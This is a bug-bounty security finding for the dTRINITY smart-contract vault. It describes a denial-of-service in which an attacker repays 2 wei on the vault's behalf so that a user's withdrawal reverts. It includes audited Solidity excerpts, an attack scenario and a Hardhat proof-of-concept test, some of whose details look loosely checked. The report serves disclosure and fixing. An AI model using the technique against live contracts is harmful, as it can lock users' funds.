# [M] Attacker can DOS the last user who wants to withdraw

## Summary
Severity: Medium
Chain: Smart contract
Component: dTRINITY
Published: 2025-06-18
Source: https://github.com/hats-finance/dTRINITY-0xee5c6f15e8d0b55a5eff84bb66beeee0e6140ffe/issues/127
Type: hats-finding

## Details
**Github username:** @Tomiwasa0
  **Twitter username:** --
  **HATS Profile:** [HATS Profile](https://app.hats.finance/profile/Bigsam)

  **Beneficiary:** 0x95f04DaAf8999F9fD232eB61916952Da2CE197A8
  **Submission hash (on-chain):** 0x591787555207a395813bc46276099d991761ec24e63901f0f508ee022876a254
  **Severity:** medium
  
  **Description:**
  **Description**\

The repay function checks a tolerance amount and reverts if the amount used to repay is greater than or less than the amount passed in. 
An attacker can weaponise this by repaying 2 wei directly on behalf of the contract. 
This amount is so small but it is enough to trigger a revert of the user's call to withdraw.


```solidity
    /**
     * @dev Repay debt to the lending pool, and make sure the output is as expected
     * @param token Address of the token
     * @param amount Amount of tokens to repay
     * @param onBehalfOf Address to repay on behalf of
     */
    function _repayDebtToPool(
        address token,
        uint256 amount,
        address onBehalfOf
    ) internal {
        // At this step, we assume that the funds from the depositor are already in the vault

        uint256 tokenBalanceBeforeRepay = ERC20(token).balanceOf(onBehalfOf);

        _repayDebtToPoolImplementation(token, amount, onBehalfOf);

        uint256 tokenBalanceAfterRepay = ERC20(token).balanceOf(onBehalfOf);

        // Ensure the balance actually decreased
        if (tokenBalanceAfterRepay >= tokenBalanceBeforeRepay) {
            revert TokenBalanceNotDecreasedAfterRepay(
                token,
                tokenBalanceBeforeRepay,
                tokenBalanceAfterRepay,
                amount
            );
        }

@audit>>        // Now, allow a 1-wei rounding tolerance on the observed balance decrease.
@audit>>         uint256 observedDiffRepay = tokenBalanceBeforeRepay -
            tokenBalanceAfterRepay;


@audit>>         if (observedDiffRepay > amount) {
@audit>>             if (observedDiffRepay - amount > BALANCE_DIFF_TOLERANCE) {
                revert UnexpectedRepayAmountToPool(
                    token,
                    tokenBalanceBeforeRepay,
                    tokenBalanceAfterRepay,
                    amount
                );
            }
        } else {
            if (amount - observedDiffRepay > BALANCE_DIFF_TOLERANCE) {
                revert UnexpectedRepayAmountToPool(
                    token,
                    tokenBalanceBeforeRepay,
                    tokenBalanceAfterRepay,
                    amount
                );
            }
        }
    }
```

Repay function is open to all 

Allowing attacker to DOS the last user to withdraw 

```solidity
 function executeRepay(
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    DataTypes.UserConfigurationMap storage userConfig,
    DataTypes.ExecuteRepayParams memory params
  ) external returns (uint256) {
    DataTypes.ReserveData storage reserve = reservesData[params.asset];
    DataTypes.ReserveCache memory reserveCache = reserve.cache();
    reserve.updateState(reserveCache);

    (uint256 stableDebt, uint256 variableDebt) = Helpers.getUserCurrentDebt(
      params.onBehalfOf,
      reserveCache
    );

    ValidationLogic.validateRepay(
      reserveCache,
      params.amount,
      params.interestRateMode,
      params.onBehalfOf,
      stableDebt,
      variableDebt
    );

@audit>>     uint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE
      ? stableDebt
      : variableDebt;

    // Allows a user to repay with aTokens without leaving dust from interest.
    if (params.useATokens && params.amount == type(uint256).max) {
      params.amount = IAToken(reserveCache.aTokenAddress).balanceOf(msg.sender);
    }

@audit>>     if (params.amount < paybackAmount) {
      paybackAmount = params.amount;
    }

    if (params.interestRateMode == DataTypes.InterestRateMode.STABLE) {
      (reserveCache.nextTotalStableDebt, reserveCache.nextAvgStableBorrowRate) = IStableDebtToken(
        reserveCache.stableDebtTokenAddress
      ).burn(params.onBehalfOf, paybackAmount);
    } else {
      reserveCache.nextScaledVariableDebt = IVariableDebtToken(
        reserveCache.variableDebtTokenAddress
      ).burn(params.onBehalfOf, paybackAmount, reserveCache.nextVariableBorrowIndex);
    }

```

If the amount passed is greater than the total debt , Aave uses the total debt to repay the maximum debt. Repaying 2 wei will cause the code to leave 2 wei of the collateral token in the contract, which allows an attacker to successfully Ddos the last user.



**Attack Scenario**\


1. **Setup:**

   * A user has an open position in the vault with some outstanding debt.
   * That user later attempts to withdraw collateral, which internally triggers the vault's `_repayDebtToPool()` logic to first repay outstanding debt.

2. **Attack Execution:**

   * Attacker calls the external `executeRepay()` function directly on the lending pool.
   * They repay a very small amount (e.g., `2 wei`) **on behalf of the vault address**.

3. **Impact:**

   * When the vault tries to repay the full expected amount, its internal `_repayDebtToPool()` observes a mismatch between the expected and actual balance delta.
   * Because this mismatch exceeds the `BALANCE_DIFF_TOLERANCE`, the call reverts.
   * As a result, the user's withdrawal fails — effectively **locking the user’s funds**.

4. **Denial of Service (DoS):**

   * The attacker can repeatedly call the external repay function with small wei amounts to **the last user's withdrawals** that rely on `_repayDebtToPool()` for debt repayment.




---

**Attachments**

1. **Proof of Concept (PoC) File**
To demonstrate the **repay-based denial-of-service (DoS)** vulnerability, we’ll modify your existing test by simulating an attacker who repays **2 wei** of the debt token **on behalf of the vault** just before the user redeems small shares.

This attack will cause the internal `_repayDebtToPool()` call to revert because the vault observes an incorrect debt token balance change, violating the rounding tolerance.

---

### ✅ Modified Test to Demonstrate DoS via Tiny Repay

```ts
it("Should revert redeem if attacker griefs by repaying 2 wei on behalf of vault", async function () {
  const user = accounts[1];
  const attacker = accounts[2];
  const userAddress = user.address;

  // Set mock prices
  await dloopMock.setMockPrice(await collateralToken.getAddress(), ethers.parseUnits("1.2", 8));
  await dloopMock.setMockPrice(await debtToken.getAddress(), ethers.parseUnits("0.8", 8));

  // User deposits into vault
  const depositAmount = ethers.parseEther("100");
  await collateralToken.connect(user).approve(await dloopMock.getAddress(), depositAmount);
  await dloopMock.connect(user).deposit(depositAmount, userAddress);

  // Track state before redeem
  const leverageBefore = await dloopMock.getCurrentLeverageBps();
  const initialShares = await dloopMock.balanceOf(userAddress);
  const smallShares = initialShares / 1000n;
  const expectedAssets = await dloopMock.previewRedeem(smallShares);
  const requiredDebtRepayment = await dloopMock.getRepayAmountThatKeepCurrentLeverage(
    await collateralToken.getAddress(),
    await debtToken.getAddress(),
    expectedAssets,
    leverageBefore,
  );

  // User approves vault to pull debt tokens for internal repay
  await debtToken.connect(user).approve(await dloopMock.getAddress(), requiredDebtRepayment);

  // 🧨 Attacker griefs by repaying 2 wei of debt token on behalf of the vault
  const attackerRepayAmount = 2n;
  await debtToken.connect(attacker).mint(attacker.address, attackerRepayAmount); // assume test debt token has mint
  await debtToken.connect(attacker).approve(await lendingPool.getAddress(), attackerRepayAmount);
  await lendingPool.connect(attacker).executeRepay(
    await debtToken.getAddress(),
    attackerRepayAmount,
    2, // variable debt
    await dloopMock.getAddress() // repaying *on behalf of the vault*
  );

  // 🎯 Redeem should now revert due to balance diff mismatch
  await expect(
    dloopMock.connect(user).redeem(smallShares, userAddress, userAddress)
  ).to.be.revertedWith("UnexpectedRepayAmountToPool"); // or similar revert reason
});
```

2. **Revised Code File (Optional)**

The fix is to remove the strict check revert when the amount is greater than the repaid amount and sweep the difference instead this prevents this attack
